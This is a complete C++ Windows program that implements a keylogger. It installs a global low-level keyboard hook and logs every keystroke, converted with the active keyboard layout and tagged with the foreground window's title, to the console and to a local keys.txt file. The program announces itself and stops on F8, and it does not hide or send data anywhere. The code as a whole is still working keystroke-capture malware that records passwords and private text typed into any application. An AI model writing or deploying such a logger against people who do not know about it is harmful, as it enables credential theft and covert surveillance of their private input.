#include <Windows.h>
#include <iostream>

#include <fstream>
#include <locale>
#include <sstream>
#include <string>
#include <io.h>
#include <fcntl.h>

using namespace std;

void WriteKey(const KBDLLHOOKSTRUCT& key)
{
    // Open the UTF-8 file once. New records are added at the end.
    static wofstream file;
    if (!file.is_open()) {
        file.imbue(locale(".UTF8"));
        file.open("keys.txt", ios::app | ios::binary);
        if (!file) {
            wcerr << L"Unable to open keys.txt." << endl;
            PostQuitMessage(1);
            return;
        }
    }

    // Read the active window's title and keyboard layout.
    HWND window = GetForegroundWindow();
    wchar_t title[1024]{};
    if (!GetWindowTextW(window, title, 1024)) {
        lstrcpyW(title, L"Untitled or unavailable");
    }
    DWORD threadId = GetWindowThreadProcessId(window, nullptr);
    GUITHREADINFO info{};
    info.cbSize = sizeof(info);
    if (threadId && GetGUIThreadInfo(threadId, &info) && info.hwndFocus) {
        threadId = GetWindowThreadProcessId(info.hwndFocus, nullptr);
    }
    HKL layout = GetKeyboardLayout(threadId);

    // Read Shift, Ctrl and Alt before converting the key to a character.
    BYTE state[256]{};
    GetKeyboardState(state);
    for (int vk : { VK_SHIFT, VK_CONTROL, VK_MENU }) {
        state[vk] = (GetAsyncKeyState(vk) & 0x8000) ? 0x80 : 0;
    }
    state[key.vkCode] |= 0x80;

    // Convert the key using the active layout, not just its English key name.
    wchar_t text[16]{};
    UINT scanCode = key.scanCode ? key.scanCode :
        MapVirtualKeyExW(key.vkCode, MAPVK_VK_TO_VSC, layout);
    // Flag 4 avoids changing the foreground application's dead-key state (Windows 10 1607+).
    int length = ToUnicodeEx(key.vkCode, scanCode, state, text, 16, 4, layout);

    // Build one line, then write the same line to the console and file.
    wostringstream record;
    record << L"Active window: " << title
           << L" | Key code: " << key.vkCode
           << L" | Letter: ";
    if (length < 0) {
        record << L"[dead key]";
    }
    else if (length == 0) {
        record << L"[non-character key]";
    }
    else if (text[0] == L'\r' || text[0] == L'\n') {
        record << L"[Enter]";
    }
    else if (text[0] == L'\t') {
        record << L"[Tab]";
    }
    else if (text[0] < L' ') {
        record << L"[control character]";
    }
    else {
        record.write(text, length);
    }
    wcout << record.str() << endl;
    file << record.str() << endl;
    if (!file) {
        wcerr << L"Unable to write to keys.txt." << endl;
        PostQuitMessage(1);
    }
}

LRESULT CALLBACK KeyboardHook(int code, WPARAM event, LPARAM data)
{
    if (code == HC_ACTION && (event == WM_KEYDOWN || event == WM_SYSKEYDOWN))
    {
        const auto& key = *reinterpret_cast<const KBDLLHOOKSTRUCT*>(data);
        if (key.vkCode == VK_F8) 
        {
            PostQuitMessage(0);
        }
        else 
        {
            WriteKey(key);
        }
    }
    return CallNextHookEx(nullptr, code, event, data);
}

int main()
{
    // Wide console output is UTF-16; the log file is independently encoded as UTF-8.
    if (_setmode(_fileno(stdout), _O_U16TEXT) == -1 ||
        _setmode(_fileno(stderr), _O_U16TEXT) == -1) {
        return 1;
    }
    wcout << L"Keyboard logging is active. Press F8 to stop." << endl;
    wcout << L"Log file: keys.txt (current working directory)." << endl;
    wcout << L"Characters use the focused window's keyboard layout." << endl;

    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandleW(nullptr), 0);
    if (!hook) {
        wcerr << L"Unable to install the keyboard hook. Error: " << GetLastError() << endl;
        return 1;
    }

    MSG message{};
    BOOL status;

    while ((status = GetMessageW(&message, nullptr, 0, 0)) > 0)
    {
        DispatchMessageW(&message);
    }

    UnhookWindowsHookEx(hook);
    if (status == -1) {
        wcerr << L"Unable to read a window message. Error: " << GetLastError() << endl;
        return 1;
    }
    return static_cast<int>(message.wParam);
}
